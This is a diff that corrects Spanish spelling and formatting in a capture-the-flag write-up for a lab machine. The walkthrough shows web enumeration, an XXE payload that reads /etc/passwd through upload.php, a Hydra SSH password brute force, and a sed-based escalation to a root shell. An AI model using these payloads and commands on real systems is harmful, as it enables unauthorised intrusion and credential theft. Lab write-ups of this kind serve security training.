@@ -29,7 +29,7 @@ Fecha: 2026-03-04
 ---
 <img width="800" height="800" alt="Pasted image 20260304125815" src="https://github.com/user-attachments/assets/78971801-a627-423c-aa85-25b1361d0b4c" />
 
-Empezaremos con un descubrimiento de *IP* dentro de la red para ver donde se encuentra nuestro objetivo.
+Empezaremos con un descubrimiento de *IP* dentro de la red para ver dónde se encuentra nuestro objetivo.
 
 ```bash
  sudo arp-scan -I eth0 --localnet                                  
@@ -47,7 +47,7 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 1.949 seconds (131.35 hosts/sec). 4 responded
 ```
 
-Vemos que la maquina se encuentra en la dirección **10.0.11.13** así que empecemos con la enumeración de puertos.
+Vemos que la máquina se encuentra en la dirección **10.0.11.13**, así que empecemos con la enumeración de puertos.
 
 ```bash
  settarget 10.0.11.13            
@@ -80,7 +80,7 @@ Tenemos 2 puertos abiertos:
 
 Con estos indicios empezaremos por ver que hay en la web.
 
-A primera vista no encontramos nada, solo una web estática sobre madera, con un formulario de contacto que no funciona, al ver el código de la web mediante *CTRL+U* no encontramos nada de interés salvo un *js* que contiene una linea nada mas.
+A primera vista no encontramos nada, solo una web estática sobre madera con un formulario de contacto que no funciona. Al ver el código de la web mediante `CTRL+U` no encontramos nada de interés salvo un `js` que contiene una línea sin más.
 
 ```javascript
 console.log("CastorTech funcionando correctamente");
@@ -117,9 +117,9 @@ Finished
 ===============================================================
 ```
 
-Encontramos varios cosas interesantes.
-- Carpeta **uploads** la cual tiene *directory listing* y podemos ver que esta vacia.
-- Fichero **upload.php** para la subida de archivos
+Encontramos varias cosas interesantes.
+- Carpeta **uploads**, la cual tiene *directory listing* y podemos ver que está vacía.
+- Fichero **upload.php** para la subida de archivos.
 
 Vamos a probar con **upload.php** a ver si podemos subir algo, pero nos encontramos con un mensaje.
 
@@ -127,7 +127,7 @@ Vamos a probar con **upload.php** a ver si podemos subir algo, pero nos encontra
 xml not provided
 ```
 
-Probaremos con *Burp Suite* para interceptar las peticiones y así poder realizar peticiones con contenido *XML* y ver sus respuestas.
+Probaremos con **Burp Suite** para interceptar las peticiones y así poder enviar contenido `XML` y ver sus respuestas.
 
 Empecemos con algo simple y veamos que ocurre.
 
@@ -142,7 +142,7 @@ El fichero `upload.php` procesa contenido XML sin deshabilitar la resolución de
 
 Esto permite realizar un ataque **XML External Entity (XXE)** para acceder a archivos locales del sistema.
 
-Vamos a explotar XXE para obtener lectura de archivos locales y ver el contenido de */etc/passwd*.
+Vamos a explotar XXE para obtener lectura de archivos locales y ver el contenido de `/etc/passwd`.
 
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
@@ -188,7 +188,7 @@ castorcin:x:1001:1001:castorcin,,,:/home/castorcin:/bin/bash
 </root>
 ```
 
-De este listado vemos un usuario que nos puede servir **castorcin** así que ahora toca mirar si encontramos la contraseña contra *SSH*.
+De este listado vemos un usuario que nos puede servir, **castorcin**, así que ahora toca mirar si encontramos la contraseña por **SSH**.
 
 ```bash
  hydra -l castorcin -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
@@ -202,7 +202,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-04 13:48:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-04 13:48:32
 ```
 
-Ahora con los credenciales toca explorar el servidor para ver que podemos obtener.
+Ahora, con las credenciales, toca explorar el servidor para ver qué podemos obtener.
 
 ```bash
  ssh castorcin@$TARGET
@@ -251,7 +251,7 @@ castorcin@TheHackersLabs-Castor:~$ find / -perm -4000 2>/dev/null
 castorcin@TheHackersLabs-Castor:~$ 
 ```
 
-Parece que tenemos una opción de escalada mediante **sed** y en la web de [GtfoBins](https://gtfobins.org/gtfobins/sed/) tenemos algo que podemos aprovechar.
+Parece que tenemos una opción de escalada mediante **sed** y en la web de [GTFOBins](https://gtfobins.org/gtfobins/sed/) tenemos algo que podemos aprovechar.
 
 ```bash
 castorcin@TheHackersLabs-Castor:~$ sudo -u root sed -n '1e exec /bin/sh -p 1>&0' /etc/hosts
